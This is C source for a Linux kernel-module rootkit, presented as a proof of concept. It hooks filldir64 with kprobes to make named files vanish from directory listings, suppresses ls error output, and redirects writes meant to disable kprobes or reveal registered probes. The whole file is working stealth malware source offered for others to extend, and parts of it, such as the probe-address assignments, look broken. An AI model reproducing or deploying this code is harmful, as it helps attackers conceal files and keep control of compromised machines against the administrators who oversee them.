/*
 * Build a seperate Makefile for this -- its mostly just proof of concept 
 * so you might just want to build upon the ideas that it utilizes.	
 */

#include <linux/kprobes.h>
#include <linux/module.h>
#include <linux/fs.h>
#include <linux/stat.h>
#include <linux/dirent.h>
#include <linux/file.h>
#include <linux/sched.h>
#include <asm/uaccess.h>

MODULE_LICENSE("GPL");

char *hidden_files[] = 
{
#define HIDDEN_FILES_MAX 3
        "test1",
        "test2",
        "test3"
};

struct getdents_callback64 {
        struct linux_dirent64 __user * current_dir;
        struct linux_dirent64 __user * previous;
        int count;
        int error;
};

/* Global data for kretprobe to act on */
static struct global_dentry_info
{
        unsigned long d_name_ptr;
        int bypass;
} g_dentry;

#define ROUND_UP64(x) (((x)+sizeof(u64)-1) & ~(sizeof(u64)-1))
#define stack_addr(regs) ((unsigned long *)&regs->sp)
#define NAME_OFFSET(de) ((int) ((de)->d_name - (char __user *) (de)))

/* CHANGE THE NEXT 2 LINES TO MATCH YOUR SYSTEM (YES TOO LAZY TO PUT AN INSTALL SCRIPT SORRY)
 */
unsigned long (*n_kallsyms_lookup_name)(char *) = 0xc0181670;
long enabled_ino = 5037; // change this to ls -i of /sys/kernel/debug/kprobes/enabled
long kp_list_ino = 5036; // change this to ls -i of /sys/kernel/debug/kprobes/list
asmlinkage long (*_sys_close)(unsigned int fd);
asmlinkage long (*_sys_open)(const char __user *filename, int flags, int mode);
char * (*_get_task_comm)(char *, struct task_struct *);

/* Our jprobe handler that globally saves the pointer value of dirent->d_name */
/* so that our kretprobe can modify that location */
static int j_filldir64(void * __buf, const char * name, int namlen, loff_t 
offset, u64 ino, unsigned int d_type)
{
        
        int found_hidden_file, i;
        struct linux_dirent64 __user *dirent;
        struct getdents_callback64 * buf = (struct getdents_callback64 *) __buf;
        dirent = buf->current_dir;
        int reclen = ROUND_UP64(NAME_OFFSET(dirent) + namlen + 1);
        
        /* Initialize custom stuff */
        g_dentry.bypass = 0;
        found_hidden_file = 0;
        for (i = 0; i < HIDDEN_FILES_MAX; i++)
                if (strcmp(hidden_files[i], name) == 0)
                        found_hidden_file++;
        if (!found_hidden_file)
                goto end;
        
        /* Create pointer to where we need to modify in dirent */
        /* since someone is trying to view a file we want hidden */
        g_dentry.d_name_ptr = (unsigned long)(unsigned char *)dirent->d_name;
        g_dentry.bypass++; // note that we want to bypass viewing this file
        
        end:
        jprobe_return();
        return 0;
}

/* Our kretprobe handler, which we use to nullify the filename */
/* Remember the 'return probe technique'? Well this is it. */
static int filldir64_ret_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
{
        char *ptr, null = 0;
        /* Someone is looking at one of our hidden files */
        if (g_dentry.bypass)
        {
                /* Lets nullify the filename so it simply is invisible */
                ptr = (char *)g_dentry.d_name_ptr;
                copy_to_user((char *)ptr, &null, sizeof(char));
        }
}

/* This handles redirection of various sys_write's() to /dev/null
 * to serve all of our purposes. 				
 * 1. Hide stderr from stat output
 * 2. Prevent someone from disabling our kprobes with echo 0 > /sys/kernel/debug/kprobes/enabled
 * 3. Prevent someone from seeing our kprobes written to the screen from debug/kprobes/list
 */

static int global_fd;
static int stream_redirect = 0;
asmlinkage static int j_sys_write(int fd, void *buf, unsigned int len)
{
        char *s = (char *)buf;
        char null = '\0';
        char devnull[] = "/dev/null";
        struct file *file;
        struct dentry *dentry = NULL;
        unsigned int ino;
        int ret;
        char comm[255];
        
        stream_redirect = 0; // do we redirect to /dev/null?
 
        /* Make sure this is an ls program */
        /* otherwise we'd prevent other programs */
        /* From being able to send 'cannot access' */
        /* in their stderr stream, possibly */       
        _get_task_comm(comm, current);
	printk("comm: %s\n", comm);
        if (strcmp(comm, "ls"))	
                goto do_inode_check;
	else	
        /* check to see if this is an ls stat complaint, or ls -l weirdness */
        /* There are two separate calls to sys_write hence two strstr checks */
        if (strstr(s, "cannot access") || strstr(s, "ls:"))  
        {
                printk("Going to redirect\n");
                goto redirect;  
        }

do_inode_check:
        /* Check to see if they are trying to disable kprobes */
        /* with 'echo 0 > /sys/kernel/debug/kprobes/enabled' */
        file = fget(fd);
        if (!file)
                goto out;
        dentry = dget(file->f_path.dentry);
        if (!dentry)
                goto out;
        ino = dentry->d_inode->i_ino;
        dput(dentry);
        fput(file);
	/* If someone tries to disable kprobes or tries to see our probes */
	/* in /sys/kernel/debug/kprobes, it aint happening */
        if (ino == enabled_ino)
	{
		printk("ino: %u\n", ino);	
		goto redirect;
	}
	else
		goto out;
redirect:
        /* If we made it here, then we are doing a redirect to /dev/null */
        stream_redirect++;
        mm_segment_t o_fs = get_fs();
        set_fs(KERNEL_DS);

        _sys_close(fd);
        fd = _sys_open(devnull, O_RDWR, 0);
        
        set_fs(o_fs);
        global_fd = fd;

        out:
        jprobe_return();
        return 0;
}
/* Here is the return handler to close the fd to /dev/null. */
static int sys_write_ret_handler(struct kretprobe_instance *ri, struct pt_regs *regs)
{
        if (stream_redirect)
        {
                _sys_close(global_fd);
                stream_redirect = 0;
        }
        return 0;
}

static struct jprobe syswrite_jp =
{
	.entry = (kprobe_opcode_t *)j_sys_write
};

static struct jprobe filldir64_jp =
{
	.entry = (kprobe_opcode_t *)j_filldir64
};

static struct kretprobe filldir64_kp =
{
	.handler = filldir64_ret_handler,
	.maxactive = NR_CPUS
};

static struct kretprobe syswrite_kp =
{
	.handler = sys_write_ret_handler,
	.maxactive = NR_CPUS
};

void exit_module(void)
{
	unregister_kretprobe(&filldir64_kp);
        unregister_kretprobe(&syswrite_kp);
        
        unregister_jprobe(&filldir64_jp);
        unregister_jprobe(&syswrite_jp);
}
int init_module(void)
{
	filldir64_kp.kp.addr = syswrite_jp.kp.addr = (kprobe_opcode_t *)n_kallsyms_lookup_name("sys_write");
	filldir64_kp.kp.addr = filldir64_jp.kp.addr = (kprobe_opcode_t *)n_kallsyms_lookup_name("filldir64");
	
	_sys_close = (void *)n_kallsyms_lookup_name("sys_close");
	_sys_open = (void *)n_kallsyms_lookup_name("sys_open");
	_get_task_comm = (void *)n_kallsyms_lookup_name("get_task_comm");
	
	register_kretprobe(&filldir64_kp);
	register_kretprobe(&syswrite_kp);
	
	register_jprobe(&filldir64_jp);
	register_jprobe(&syswrite_jp);
	return 0;
}

module_exit(exit_module);


		


